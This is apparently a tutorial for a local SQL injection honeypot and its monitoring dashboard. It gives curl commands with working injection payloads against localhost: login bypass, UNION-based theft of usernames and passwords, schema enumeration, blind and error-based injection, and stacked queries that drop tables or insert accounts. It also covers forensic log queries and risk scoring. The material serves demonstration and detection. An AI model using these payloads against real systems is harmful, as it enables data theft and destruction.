# SQL Injection Honeypot Tutorial

This tutorial demonstrates different types of SQL injection attacks and how they are detected and classified by the honeypot system.

## Attack Examples by Severity Level

### LOW Severity Attacks (0.0-0.3)
These attacks use basic SQL injection patterns like comments and simple LIKE injections.

```bash
# Test basic comment injection
curl "http://localhost:9000/api/products?category=test'--"

# Test simple LIKE injection
curl "http://localhost:9000/api/products?category=test%' LIKE '%"
```

### MEDIUM Severity Attacks (0.3-0.5)
These attacks attempt authentication bypass using OR/AND conditions.

```bash
# Test login bypass with OR condition
curl -X POST http://localhost:9000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=anything"

# Test login bypass with always true condition
curl -X POST http://localhost:9000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR 'x'='x&password=anything"
```

### HIGH Severity Attacks (0.5-0.7)
These attacks attempt to extract data using UNION SELECT statements.

```bash
# Test UNION SELECT injection
curl "http://localhost:9000/api/products?category=1' UNION SELECT NULL,NULL,NULL,NULL,NULL --"

# Test data extraction attempt
curl "http://localhost:9000/api/products?category=1' UNION SELECT username,password,email,id,NULL FROM users --"
```

### CRITICAL Severity Attacks (0.7-1.0)
These attacks attempt schema enumeration or destructive operations.

```bash
# Test schema enumeration
curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,NULL,NULL,table_name,NULL FROM information_schema.tables --"

# Test destructive operation
curl "http://localhost:9000/api/products?category=1'; DROP TABLE users; --"
```

## Advanced Attack Scenarios

### 1. Blind SQL Injection (MEDIUM-HIGH)
These attacks attempt to extract data without seeing the direct output.

```bash
# Time-based blind injection
curl "http://localhost:9000/api/products?category=1' AND IF(SUBSTRING(DATABASE(),1,1)='h',SLEEP(2),0) --"

# Boolean-based blind injection
curl "http://localhost:9000/api/products?category=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50 --"
```

### 2. Error-Based Injection (HIGH)
Exploiting database errors to extract information.

```bash
# Using EXTRACTVALUE for error messages
curl "http://localhost:9000/api/products?category=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --"

# Using UPDATEXML for data extraction
curl "http://localhost:9000/api/products?category=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1) --"
```

### 3. Stacked Queries (CRITICAL)
Multiple SQL statements in one query.

```bash
# Multiple operations
curl "http://localhost:9000/api/products?category=1'; INSERT INTO users (username,password) VALUES ('hacker','pwd'); --"

# Backup table creation
curl "http://localhost:9000/api/products?category=1'; CREATE TABLE backup AS SELECT * FROM users; --"
```

### 4. Advanced Schema Analysis (CRITICAL)
Detailed database structure enumeration.

```bash
# Column enumeration
curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,column_name,NULL,table_name,NULL FROM information_schema.columns WHERE table_schema='honeypot_db' --"

# Privilege enumeration
curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,grantee,NULL,privilege_type,NULL FROM information_schema.user_privileges --"
```

## Attack Patterns and Detection

### Pattern Analysis Examples

1. **Basic Pattern (LOW)**
```sql
-- Original Query
SELECT * FROM products WHERE category = 'test'
-- Injection
SELECT * FROM products WHERE category = 'test' OR '1'='1' --'
```

2. **Authentication Bypass (MEDIUM)**
```sql
-- Original Query
SELECT * FROM users WHERE username='admin' AND password='pass'
-- Injection
SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'
```

3. **Data Extraction (HIGH)**
```sql
-- Original Query
SELECT * FROM products WHERE category = '1'
-- Injection
SELECT * FROM products WHERE category = '1' UNION SELECT username,password,email,id,NULL FROM users --'
```

4. **Schema Analysis (CRITICAL)**
```sql
-- Original Query
SELECT * FROM products WHERE category = '1'
-- Injection
SELECT * FROM products WHERE category = '1' UNION ALL SELECT NULL,table_name,NULL,column_name,NULL FROM information_schema.columns --'
```

## Forensic Analysis Examples

### 1. Attack Chain Analysis
```bash
# Get sequence of attacks from same IP
mysql -u honeypot -phoneypot -e "SELECT timestamp, type, risk_score, attack_details FROM honeypot_db.attack_logs WHERE source_ip='127.0.0.1' ORDER BY timestamp ASC;"
```

### 2. Pattern Evolution
```bash
# Analyze how attack patterns evolve
mysql -u honeypot -phoneypot -e "SELECT attack_type, COUNT(*) as count, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY attack_type ORDER BY avg_risk DESC;"
```

### 3. Timeline Analysis
```bash
# Get attack timeline with details
mysql -u honeypot -phoneypot -e "SELECT DATE_FORMAT(timestamp, '%Y-%m-%d %H:00:00') as hour, COUNT(*) as attacks, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY hour ORDER BY hour DESC;"
```

### 4. Attack Vector Analysis
```bash
# Analyze common attack vectors
mysql -u honeypot -phoneypot -e "SELECT request_path, COUNT(*) as count, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY request_path ORDER BY count DESC;"
```

## Presentation Guidelines

### For Forensics Judge

1. **Evidence Collection**
   - Demonstrate comprehensive logging
   - Show attack chain analysis
   - Present timeline reconstruction
   - Highlight pattern evolution tracking

2. **Analysis Capabilities**
   - Real-time event correlation
   - Risk score calculation methodology
   - Attack pattern classification
   - Source attribution techniques

3. **Investigation Tools**
   - HSIEM dashboard features
   - Log analysis capabilities
   - Query and filtering tools
   - Timeline visualization

### For VAPT Judge

1. **Attack Detection**
   - Pattern recognition system
   - ML-based classification
   - Real-time monitoring
   - Risk scoring algorithm

2. **Defense Mechanisms**
   - Honeypot architecture
   - Deception techniques
   - Response strategies
   - Alert mechanisms

3. **Testing Methodology**
   - Attack vectors covered
   - Severity classification
   - Detection accuracy
   - False positive handling

## Understanding Attack Detection

Each attack is processed through multiple layers:

1. **Pattern Recognition**: The honeypot matches known SQL injection patterns
2. **Risk Scoring**: A risk score is calculated based on pattern severity and ML analysis
3. **HSIEM Integration**: Attacks are logged and displayed in the HSIEM dashboard

## Viewing Attack Results

You can view the results of attacks in several ways:

1. Check the HSIEM dashboard at http://localhost:9000/hsiem
2. View the logs in `hsiem_logs/` directory
3. Query the database directly:

```bash
mysql -u honeypot -phoneypot -e "SELECT timestamp, source_ip, type, risk_score FROM honeypot_db.attack_logs ORDER BY timestamp DESC LIMIT 5;"
```

## Risk Score Breakdown

The risk score for each attack is calculated using:
- Pattern-based score (70% weight)
- Machine Learning score (30% weight)
- Multiple pattern bonus (+0.1 per additional pattern)

Example severity classifications:
- LOW (0.0-0.3): Comment injections, simple patterns
- MEDIUM (0.3-0.5): Authentication bypass attempts
- HIGH (0.5-0.7): Data extraction attempts
- CRITICAL (0.7-1.0): Schema enumeration, destructive operations

## Setup Requirements

- Running honeypot application (port 9000)
- Access to HSIEM dashboard
- MySQL/MariaDB database
- Basic understanding of SQL injection techniques
- Web browser (Chrome/Firefox recommended)

## Real-time Monitoring

### Using Two Browser Windows
For the best demonstration experience:

1. **Window 1: HSIEM Dashboard**
   - Navigate to `http://localhost:9000/hsiem`
   - Keep this window visible to observe real-time updates

2. **Window 2: Attack Window**
   - Use this window to perform the attacks
   - Try different attack patterns
   - Observe how risk scores change in the HSIEM dashboard

### What to Watch For
1. **Risk Score Graph**
   - Watch the trend line move as attacks are detected
   - Notice different severity bands (color-coded)
   - Observe score spikes for more severe attacks

2. **Event List**
   - New events appear in real-time
   - Click "View" on events to see details
   - Notice pattern recognition in attack description

3. **Statistics**
   - Attack count increases
   - Risk score averages update
   - Source IP tracking

## Monitoring and Analysis

### HSIEM Dashboard
The HSIEM dashboard provides real-time monitoring of attacks:
1. Risk score trending
2. Attack type classification
3. Detailed event information
4. Source IP tracking

### Log Analysis
Three types of logs are maintained:
1. **Database Logs**: Detailed attack information in `attack_logs` table
2. **Honeypot Logs**: Application-level logging in `logs/honeypot.log`
3. **HSIEM Logs**: Security event logs in `hsiem_logs/`

### Risk Score Calculation
Risk scores are calculated based on multiple factors:
- Attack complexity
- Target sensitivity
- Potential impact
- Attack technique sophistication

## Prevention and Response

### Automated Responses
The system automatically:
1. Logs all attack attempts
2. Calculates risk scores
3. Generates security alerts
4. Maintains attack history

### Best Practices
1. Regularly monitor the HSIEM dashboard
2. Investigate high and critical severity attacks
3. Update attack signatures
4. Review and analyze attack patterns

## Conclusion

This honeypot system effectively detects and classifies SQL injection attacks while providing valuable insight into attack patterns and techniques. The risk scoring system helps prioritize security responses, while comprehensive logging enables detailed forensic analysis. Using both browser-based and command-line testing methods provides a comprehensive understanding of how attacks are detected and analyzed in real-world scenarios. 